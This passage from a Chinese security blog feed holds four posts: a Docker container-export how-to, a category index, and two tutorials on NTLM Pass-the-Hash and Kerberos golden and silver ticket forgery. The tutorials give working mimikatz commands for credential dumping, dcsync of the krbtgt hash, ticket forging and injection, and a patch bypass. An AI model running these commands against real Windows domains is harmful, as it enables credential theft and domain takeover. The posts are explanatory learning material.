      <link href="/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/"/>
      <url>/2020/05/22/docker!%E6%89%93%E5%8C%85%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%BF%AB%E9%80%9F%E6%8B%96%E7%8E%AF%E5%A2%83%E8%B7%91%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>遇到了一个docker环境，需求带回来自己调试，所以记录大致流程<br>docker:打包正在运行的容器，快速拖环境跑路</p><h2 id="获取正在运行的容器"><a href="#获取正在运行的容器" class="headerlink" title="获取正在运行的容器"></a>获取正在运行的容器</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExODAwMDcucG5n?x-oss-process=image/format,png" alt="image-20200521180007008"></p><p>找到ID 6996fffb6bfa</p><h2 id="将容器打包成镜像"><a href="#将容器打包成镜像" class="headerlink" title="将容器打包成镜像"></a>将容器打包成镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker commit -a &quot;runoob.com&quot; -m &quot;my apache&quot; 容器名称或id 打包的镜像名称:标签</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExNzU5NTEucG5n?x-oss-process=image/format,png" alt="image-20200521175951273"></p><h2 id="拖到本地"><a href="#拖到本地" class="headerlink" title="拖到本地"></a>拖到本地</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save cnvd -o &#x2F;Users&#x2F;zy&#x2F;Documents&#x2F;source&#x2F;sec.tar</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MjExODAzMTgucG5n?x-oss-process=image/format,png" alt="image-20200521180317972"></p><h2 id="导入镜像"><a href="#导入镜像" class="headerlink" title="导入镜像"></a>导入镜像</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker load -i hackgod-demo.tar</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快速导航--文章查询--分类（持续更新）</title>
      <link href="/2020/05/17/%E5%BF%AB%E9%80%9F%E5%AF%BC%E8%88%AA--%E6%96%87%E7%AB%A0%E6%9F%A5%E8%AF%A2--%E5%88%86%E7%B1%BB%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
      <url>/2020/05/17/%E5%BF%AB%E9%80%9F%E5%AF%BC%E8%88%AA--%E6%96%87%E7%AB%A0%E6%9F%A5%E8%AF%A2--%E5%88%86%E7%B1%BB%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>现在突然发现自己写的东西有点乱，需要分类整理一下，出一个导航栏<br>主要csdn这些博客导航做的不会，只能我手动来整理一下来</p><h1 id="0x01-文章类别快速导航"><a href="#0x01-文章类别快速导航" class="headerlink" title="0x01 文章类别快速导航"></a>0x01 文章类别快速导航</h1><ul><li><h2 id="内网安全"><a href="#内网安全" class="headerlink" title="内网安全"></a>内网安全</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9778006.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9778006.html</a></p><ul><li><h2 id="代码审计-和-审计方面的漏洞分析"><a href="#代码审计-和-审计方面的漏洞分析" class="headerlink" title="代码审计 和 审计方面的漏洞分析"></a>代码审计 和 审计方面的漏洞分析</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9295109.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9295109.html</a></p><ul><li><h2 id="二进制安全研究-（多是学习笔记）"><a href="#二进制安全研究-（多是学习笔记）" class="headerlink" title="二进制安全研究 （多是学习笔记）"></a>二进制安全研究 （多是学习笔记）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9975475.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9975475.html</a></p><ul><li><h2 id="人工智能机器学习与安全研究-（明年后年预计要和学业结合出东西，暂时没东西）"><a href="#人工智能机器学习与安全研究-（明年后年预计要和学业结合出东西，暂时没东西）" class="headerlink" title="人工智能机器学习与安全研究 （明年后年预计要和学业结合出东西，暂时没东西）"></a>人工智能机器学习与安全研究 （明年后年预计要和学业结合出东西，暂时没东西）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9577499.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9577499.html</a></p><ul><li><h2 id="安全开发方向-（主要是关于python的一些东西）"><a href="#安全开发方向-（主要是关于python的一些东西）" class="headerlink" title="安全开发方向 （主要是关于python的一些东西）"></a>安全开发方向 （主要是关于python的一些东西）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9703279.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9703279.html</a></p><ul><li><h2 id="配环境杂项（主要是一些坑点，网上难搜的记录下来）"><a href="#配环境杂项（主要是一些坑点，网上难搜的记录下来）" class="headerlink" title="配环境杂项（主要是一些坑点，网上难搜的记录下来）"></a>配环境杂项（主要是一些坑点，网上难搜的记录下来）</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_8944538.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_8944538.html</a></p><ul><li><h2 id="WEB方向漏洞-复现-和分析"><a href="#WEB方向漏洞-复现-和分析" class="headerlink" title="WEB方向漏洞 复现 和分析"></a>WEB方向漏洞 复现 和分析</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9013212.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9013212.html</a></p><ul><li><h2 id="APP-方向"><a href="#APP-方向" class="headerlink" title="APP 方向"></a>APP 方向</h2></li></ul><p><a href="https://blog.csdn.net/god_zzz/category_9032877.html" target="_blank" rel="noopener">https://blog.csdn.net/god_zzz/category_9032877.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全:NTML认证流程和PTH原理</title>
      <link href="/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/"/>
      <url>/2020/05/14/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!NTML%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B%E5%92%8CPTH%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h3 id="NTML认证流程和PTH原理"><a href="#NTML认证流程和PTH原理" class="headerlink" title="NTML认证流程和PTH原理."></a>NTML认证流程和PTH原理.</h3><ul><li><ul><li><a href="#0x01__3">0x01 本地认证流程</a></li><li><a href="#0x02__26">0x02 网络认证</a></li><li><ul><li><a href="#LM_HashNTML_Hash_32">LM Hash和NTML Hash</a></li><li><a href="#NTLM_Hash_38">NTLM Hash</a></li><li><a href="#NTLM_V2_73">NTLM V2协议</a></li></ul></li><li><a href="#0x03_NTLM__87">0x03 NTLM 认证</a></li><li><a href="#0x04_Pass_The_Hash_PTH_105">0x04 Pass The Hash （PTH）原理</a></li><li><ul><li><a href="#_107">主要作用：</a></li><li><a href="#_113">前提：</a></li><li><a href="#_122">原理：</a></li><li><a href="#_132">使用方法：</a></li><li><a href="#_140">绕过补丁，进行哈希传递</a></li></ul></li></ul></li></ul><h2 id="0x01-本地认证流程"><a href="#0x01-本地认证流程" class="headerlink" title="0x01 本地认证流程"></a>0x01 本地认证流程</h2><p>操作系统会显示登录界面，接收输入密码后，将密码交给lsass进程，这个进程中会存一份明文密码，将明文密码加密成NTLM Hash，和SAM数据库比较认证。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTQxMzM3MzQucG5n?x-oss-process=image/format,png" alt="image-20200514133734007"></p><p>注：</p><ul><li>winlogon.exe（Windows Logon Process），用于管理用户登录和退出。</li><li>LSASS用于微软Windows系统的安全机制，它用于本地安全和登陆策略。</li></ul><h2 id="0x02-网络认证"><a href="#0x02-网络认证" class="headerlink" title="0x02 网络认证"></a>0x02 网络认证</h2><p>在内网中，早期SMB协议在网络上传输明文口令。后来出现LM hash，很容易就被破解，现在又有了NTLM以及Kerberos。</p><h3 id="LM-Hash和NTML-Hash"><a href="#LM-Hash和NTML-Hash" class="headerlink" title="LM Hash和NTML Hash"></a>LM Hash和NTML Hash</h3><p>Windows操作系统中的密码由两部分加密组成，即<code>LM Hash</code>和<code>NTML Hash</code>。</p><h3 id="NTLM-Hash"><a href="#NTLM-Hash" class="headerlink" title="NTLM Hash"></a>NTLM Hash</h3><p>正常的明文密码加密为NTLM Hash的方法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password ----&gt; 十六进制编码 ----&gt; Unicode转换 ----&gt; MD4加密 ----&gt; 得到NTLM Hash</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">admin -&gt; hex(16进制编码) &#x3D; 61646d696e</span><br><span class="line"></span><br><span class="line">61646d696e -&gt; Unicode &#x3D; 610064006d0069006e00</span><br><span class="line"></span><br><span class="line">610064006d0069006e00 -&gt; MD4 &#x3D; 209c6174da490caeb422f3fa5a7ae634</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left"></th><th align="left">2000</th><th align="left">xp</th><th align="left">2003</th><th align="left">Vista</th><th align="left">win7</th><th align="left">2008</th><th align="left">2012</th></tr></thead><tbody><tr><td align="left">LM</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left"></td><td align="left"></td><td align="left"></td><td align="left"></td></tr><tr><td align="left">NTLM</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td><td align="left">√</td></tr></tbody></table><p>自Server 2003之后，Windows的认证方式均为NTML Hash。</p><p>自Server 2008开始默认禁用LM Hash， 当密码超过14位时候会采用NTLM加密</p><p>所以大多数的Windows都采用NTLM协议认证，LM协议已经基本淘汰了。</p><h3 id="NTLM-V2协议"><a href="#NTLM-V2协议" class="headerlink" title="NTLM V2协议"></a>NTLM V2协议</h3><p>NTLM是Windows的一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。</p><p>NTLM v1与NTLM v2区别：</p><table><thead><tr><th>都是基于NTLM Hash加密的</th><th>NTLM v1</th><th>NTLM v2</th></tr></thead><tbody><tr><td>加密算法不同</td><td></td><td></td></tr><tr><td>Challage</td><td>8位</td><td>16位</td></tr><tr><td>Net-NTLM Hash</td><td>主要加密算法是DES</td><td>主要加密算法是HMAC-MD5</td></tr></tbody></table><h2 id="0x03-NTLM-认证"><a href="#0x03-NTLM-认证" class="headerlink" title="0x03 NTLM 认证"></a>0x03 NTLM 认证</h2><p><strong>NTLM协议的认证过程分为三步：</strong></p><ul><li>协商（主要用于确认双方协议版本）</li><li>质询（就是挑战（Chalenge）响应（Response）模式）</li><li>验证 （认证完成）</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTQxMzM3NTcucG5n?x-oss-process=image/format,png" alt="image-20200514133757850"></p><p>整个过程中 NTML hash 是没有在网络上传递的</p><h2 id="0x04-Pass-The-Hash-（PTH）原理"><a href="#0x04-Pass-The-Hash-（PTH）原理" class="headerlink" title="0x04 Pass The Hash （PTH）原理"></a>0x04 Pass The Hash （PTH）原理</h2><h3 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h3><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。</p><h3 id="前提："><a href="#前提：" class="headerlink" title="前提："></a>前提：</h3><p>抓取管理员的密码、NTLM Hash</p><ul><li>认证的用户名 （质询第一步需要）</li><li>认证用户的NTLM Hash</li></ul><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p>哈希传递就是伪造一个客户端，和正常的NTML认证一样</p><p>只是我们用户名对应的NTLM Hash传递到其它主机，给出的 Chanllenge加密，生成一个Response，来完成认证。</p><p>个人感觉其实不算啥漏洞，只是一种技巧手法吧。</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>在目标机器中以管理员权限运行mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:&lt;用户名&gt; &#x2F;domain:&lt;域名&gt; &#x2F;ntlm:&lt;NTML Hash&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="绕过补丁，进行哈希传递"><a href="#绕过补丁，进行哈希传递" class="headerlink" title="绕过补丁，进行哈希传递"></a>绕过补丁，进行哈希传递</h3><ul><li>当系统安装了<code>KB2871997</code>补丁，将无法使用常规的哈希传递攻击；</li><li>但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递。</li></ul><p>抓取AES-256密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;</span><br></pre></td></tr></table></figure><p>管理员权限运行mimikatz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth &#x2F;user:Administrator &#x2F;domain:zeo.com &#x2F;aes256:&lt;AES-256密钥&gt;&quot;</span><br></pre></td></tr></table></figure><p>还有很多工具 MSF CS impacket Smbexec</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos域认证流程---黄金票据和白银票据</title>
      <link href="/2020/05/12/Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
      <url>/2020/05/12/Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><p>@[TOC]</p><h2 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h2><p>算是学习之后总结记录，加深自己的理解，这里我是参考了倾旋师傅的讲解，感觉讲的比较好，加入自己的理解和一些其他东西写下来，分享出来，也方便自己回顾知识和补充<br>还有画图的问题，我自己画的太费劲了而且也看不明白，索性我就自己手画了几个，方便自己理解和熟悉流程，感觉不错，手动狗头，哈哈</p><h2 id="0x01-Kerberos域认证"><a href="#0x01-Kerberos域认证" class="headerlink" title="0x01 Kerberos域认证"></a>0x01 Kerberos域认证</h2><p>Kerberos 是一种网络认证协议，其设计目标是通过<a href="https://baike.baidu.com/item/密钥" target="_blank" rel="noopener">密钥</a>系统为客户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不依赖于<a href="https://baike.baidu.com/item/主机操作系统" target="_blank" rel="noopener">主机操作系统</a>的认证，无需基于<a href="https://baike.baidu.com/item/主机地址" target="_blank" rel="noopener">主机地址</a>的信任，不要求网络上所有主机的物理安全，并假定网络上传送的<a href="https://baike.baidu.com/item/数据包" target="_blank" rel="noopener">数据包</a>可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的<a href="https://baike.baidu.com/item/密码技术" target="_blank" rel="noopener">密码技术</a>（如：共享密钥）执行认证服务的。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDMxNTkucG5n?x-oss-process=image/format,png" alt="image-20200512103159200"></p><p>Kerberos的标志是三只狗头，分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p><strong>名词基本概念：</strong></p><ul><li><p>KDC: Key Distribution Center，密钥分发中心，负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由AS和TGS组成。</p></li><li><p>AD: Account Database，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</p><p>（物理方面 KDC和AD 都是一个机子）</p></li><li><p>TGT: Ticket Granting Ticket =  入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p></li><li><p>AS（Authentication Server）= 认证服务器,为client生成TGT的服务</p></li><li><p>TGS（Ticket Granting Server）= 票据授权服务器</p></li><li><p>SS（Service Server）= 特定服务提供端</p></li></ul><h2 id="域认证大致流程："><a href="#域认证大致流程：" class="headerlink" title="域认证大致流程："></a>域认证大致流程：</h2><ol><li><p>Client 上的用户请求KDC服务，最后AS服务生产TGT，返回给Client</p></li><li><p>Client 使用TGT请求KDC上的TGS得到ST（TGS ticket）真正访问的票据</p></li><li><p>Client使用ST（TGS Ticket）访问Server</p></li></ol><h2 id="第一部分：生成TGT-和-session-key"><a href="#第一部分：生成TGT-和-session-key" class="headerlink" title="第一部分：生成TGT 和  session key"></a>第一部分：生成TGT 和  session key</h2><p>1.Client发送自己的身份信息到KDC（身份信息中起码包含用户名），KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>2 .KDC此时生成一个随机字符串Session Key，使用客户端的NTLM Hash加密Session Key，作为AS数据，使用KDC中krbtgt用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><p>第一部分：获取了 TGT</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDAxMTcucG5n?x-oss-process=image/format,png" alt="image-20200512100117725"></p><p>注：客户端收到 TGT 是无法解密的，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，KDC Hash指的就是是krbtgt 的hash</p><p>这就是伪造黄金票据的原理，这个是后面还会有介绍。</p><h2 id="第二步：获取要访问的-server-ticket"><a href="#第二步：获取要访问的-server-ticket" class="headerlink" title="第二步：获取要访问的 server ticket"></a>第二步：获取要访问的 server ticket</h2><p>1.客户端使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>2.KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>3.验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key</p><p>这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDA1MTcucG5n?x-oss-process=image/format,png" alt="image-20200512100517747"></p><p>注释：Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><h2 id="第三部-向客户端向服务器请求认证"><a href="#第三部-向客户端向服务器请求认证" class="headerlink" title="第三部 向客户端向服务器请求认证"></a>第三部 向客户端向服务器请求认证</h2><p>客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><p>1 Ticket客户端无法解密，因为没有 Server hash，只能发送给 sever端</p><p>2 服务器端通过自己的hash解密Ticket，得到解密Server Session Key(Client info + Timestamp)</p><p>3 用刚刚解密的Session Key，解开Client info + Timestamp，验证客户端信息和时间戳</p><p>校验通过后，认证成功，该票据会一直存在客户端内存中，最后成功登陆</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMDE2MzYucG5n?x-oss-process=image/format,png" alt="image-20200512101636849"></p><p>其中白银票据的伪造就发生在这一步的认证中，下面会介绍</p><h2 id="0x01-白银票据-Silver-Tickets"><a href="#0x01-白银票据-Silver-Tickets" class="headerlink" title="0x01 白银票据(Silver Tickets)"></a>0x01 白银票据(Silver Tickets)</h2><p>白银票据前提:</p><p>1.不需要与KDC进行交互，直接和server认证</p><p>2.需要目标服务的NTLM Hash</p><p>在第三步认证中的Ticket的组成:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MTIxMTA2MDUucG5n?x-oss-process=image/format,png" alt="image-20200512110605262"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ticket&#x3D;Server Hash(Server Session Key+Client info+End Time)</span><br></pre></td></tr></table></figure><p>原理：<br>如果我们拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket，直接去server端去验证。</p><p>注：服务器是不知道Server Session Key是什么的，服务器的Server Session Key是解密ticket获得的，所以一切凭据的核心在Server Hash，有了它就开业直接伪造票据认证。</p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</span><br></pre></td></tr></table></figure><p>或MSF模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz</span><br><span class="line">meterpreter &gt; msv</span><br></pre></td></tr></table></figure><p>伪造票据:</p><p>清空当前系统的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p>伪造票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域 SID&gt; &#x2F;target:&lt;目标服务器主机名&gt; &#x2F;service:&lt;服务类型&gt; &#x2F;rc4:&lt;NTLM Hash&gt; &#x2F;user:&lt;用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::golden &#x2F;domain:zeo.com &#x2F;sid:S-1-5-21-1111111111-111111111-11111111111 &#x2F;target:DC.zeo.com &#x2F;service:CIFS &#x2F;rc4:7c4a8d09ca3762af61e59520943dc26494f8941b &#x2F;user:admin &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>验证权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h2 id="0x02-黄金票据（Golden-Ticket）"><a href="#0x02-黄金票据（Golden-Ticket）" class="headerlink" title="0x02 黄金票据（Golden Ticket）"></a>0x02 黄金票据（Golden Ticket）</h2><p>黄金票据前提:</p><p>1.需要与DC通信</p><p>2.需要krbtgt用户的hash（也就是说要拿下域控制器）</p><p>黄金票据原理：</p><p>就是伪造的TGT，它会在第二步认证被发送到KDC的TGS，如果我们有了krbtgt用户的hash就可以直接伪造TGT，其中的KDC需要的session key，是KDC解密TGT之后获取的，所以session key也是和TGT一起伪造的，那么后续的认证，就可以随意的制造想要的票据了。</p><h3 id="伪造黄金票据"><a href="#伪造黄金票据" class="headerlink" title="伪造黄金票据"></a>伪造黄金票据</h3><p>管理员权限运行mimikatz，获取关键krbtgt hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync &#x2F;user:krbtgt&quot; exit</span><br></pre></td></tr></table></figure><p>获取域中所有用户SID</p><p>只要是域用户权限就行，去掉SID最后的数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get name,sid</span><br></pre></td></tr></table></figure><p>清空现有票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit</span><br></pre></td></tr></table></figure><p>生成票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden &#x2F;domain:&lt;域名&gt; &#x2F;sid:&lt;域SID&gt; &#x2F;rc4:&lt;KRBTGT NTLM Hash&gt; &#x2F;user:&lt;任意用户名&gt; &#x2F;ptt&quot; exit</span><br></pre></td></tr></table></figure><p>还有一个简单的用法，cobalt strike中直接有一项黄金票据生产，十分方便。</p><p>将票据注入内存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt Administrator.kiribi&quot; exit</span><br></pre></td></tr></table></figure><p>当前会话中的票据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::tgt&quot; exit</span><br></pre></td></tr></table></figure><p>权限验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><h2 id="0x03-黄金票据和白银票据比较"><a href="#0x03-黄金票据和白银票据比较" class="headerlink" title="0x03 黄金票据和白银票据比较"></a>0x03 黄金票据和白银票据比较</h2><table><thead><tr><th align="left"></th><th>黄金票据</th><th>白银票据</th></tr></thead><tbody><tr><td align="left">访问权限</td><td>伪造TGT，可以获取任何Kerberos服务权限</td><td>伪造TGS，只能访问指定的服务</td></tr><tr><td align="left">加密方式</td><td>由Kerberos的Hash加密</td><td>Silver Ticket由服务账号Hash加密</td></tr><tr><td align="left">认证流程</td><td>需要访问域控认证，属于第二步认证</td><td>直接和服务器认，最后一步认证</td></tr></tbody></table><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-11-30/1</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网安全:Kerberos域认证流程---黄金票据和白银票据</title>
      <link href="/2020/05/12/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8!Kerberos%E5%9F%9F%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B---%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/"/>
